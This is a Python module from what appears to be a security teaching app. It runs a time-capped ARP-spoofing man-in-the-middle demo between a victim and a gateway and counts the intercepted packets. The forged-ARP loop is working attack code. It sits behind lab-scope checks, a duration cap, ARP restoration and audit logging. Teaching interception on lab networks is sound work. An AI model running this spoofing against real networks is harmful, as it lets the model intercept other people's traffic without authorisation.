"""
modules/mitm_module.py
-----------------------
A teaching demo of ARP-cache-poisoning MITM, used in countless network
security courses to show students how unauthenticated ARP lets a host
on the same L2 segment redirect traffic between two other hosts.

Scope and safety design:
  * BOTH the victim and the gateway IP must resolve inside your
    configured lab ranges (modules/safety.py) — this will not run
    against anything outside your own lab subnet.
  * Runs for a hard-capped duration (default 60s, max 120s) and then
    automatically sends corrective ARP replies to restore the real
    MAC mappings, so the lab network doesn't stay poisoned.
  * Every run is written to the audit log with start/stop times.
  * Requires scapy + root/CAP_NET_RAW, same as any ARP tool — the app
    will tell you plainly if that's missing rather than failing silently.

This module intercepts and summarizes traffic (protocols, IPs, ports)
for teaching purposes. It does not include packet-content logging to
disk or credential-sniffing helpers — the point of the exercise is to
show *that* interception is possible on unauthenticated ARP, not to
harvest data.
"""

import threading
import time

import config
from modules import audit_log, safety

try:
    from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr, conf  # noqa: F401
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

MAX_DURATION_SECONDS = 120
_active_sessions = {}  # session_id -> stop_event


def is_available() -> bool:
    return SCAPY_AVAILABLE


def _get_mac(ip, timeout=3):
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=timeout, verbose=False,
    )
    for _, received in ans:
        return received.hwsrc
    return None


def _spoof_loop(victim_ip, victim_mac, gateway_ip, gateway_mac, stop_event, packet_counter):
    from scapy.all import ARP, Ether, send, sniff

    def tell_victim_we_are_gateway():
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=False)

    def tell_gateway_we_are_victim():
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=False)

    def count_packet(pkt):
        packet_counter["count"] += 1

    sniffer_thread = threading.Thread(
        target=lambda: sniff(
            filter=f"host {victim_ip}",
            prn=count_packet,
            stop_filter=lambda _: stop_event.is_set(),
            store=False,
        ),
        daemon=True,
    )
    sniffer_thread.start()

    while not stop_event.is_set():
        tell_victim_we_are_gateway()
        tell_gateway_we_are_victim()
        stop_event.wait(2)

    # --- restore real ARP mappings before exiting ---
    send(
        ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac),
        count=3, verbose=False,
    )
    send(
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac),
        count=3, verbose=False,
    )


def start_demo(victim_ip: str, gateway_ip: str, duration: int, confirmed_by_user: bool):
    """
    Start a time-capped ARP-spoof MITM demo between victim_ip and
    gateway_ip. Returns (success, message, session_id|None).
    """
    for target in (victim_ip, gateway_ip):
        try:
            safety.assert_authorized_target(target, confirmed_by_user)
        except safety.OutOfScopeError as exc:
            audit_log.log("MITM_BLOCKED", f"target={target} reason={exc}")
            return False, f"Blocked: {exc}", None

    if not SCAPY_AVAILABLE:
        return False, "scapy is not installed. Run: pip install scapy", None

    duration = max(5, min(duration, MAX_DURATION_SECONDS))

    victim_mac = _get_mac(victim_ip)
    gateway_mac = _get_mac(gateway_ip)
    if not victim_mac or not gateway_mac:
        return False, "Could not resolve MAC addresses for one or both hosts. Are they online?", None

    stop_event = threading.Event()
    packet_counter = {"count": 0}
    session_id = f"{victim_ip}->{gateway_ip}-{int(time.time())}"

    thread = threading.Thread(
        target=_spoof_loop,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, stop_event, packet_counter),
        daemon=True,
    )

    _active_sessions[session_id] = {
        "stop_event": stop_event,
        "thread": thread,
        "packet_counter": packet_counter,
        "started": time.time(),
        "victim_ip": victim_ip,
        "gateway_ip": gateway_ip,
    }

    audit_log.log("MITM_START", f"victim={victim_ip} gateway={gateway_ip} duration={duration}s")
    thread.start()

    # auto-stop after the capped duration
    def _auto_stop():
        time.sleep(duration)
        if not stop_event.is_set():
            stop_event.set()
            audit_log.log("MITM_AUTO_STOP", session_id)

    threading.Thread(target=_auto_stop, daemon=True).start()

    return True, f"MITM demo started for up to {duration}s. ARP tables will auto-restore.", session_id


def stop_demo(session_id: str):
    session = _active_sessions.get(session_id)
    if not session:
        return False, "No active session with that ID."
    session["stop_event"].set()
    audit_log.log("MITM_MANUAL_STOP", session_id)
    return True, "Stop signal sent. Real ARP mappings are being restored."


def session_status(session_id: str):
    session = _active_sessions.get(session_id)
    if not session:
        return None
    return {
        "running": not session["stop_event"].is_set(),
        "elapsed": round(time.time() - session["started"], 1),
        "packets_observed": session["packet_counter"]["count"],
        "victim_ip": session["victim_ip"],
        "gateway_ip": session["gateway_ip"],
    }
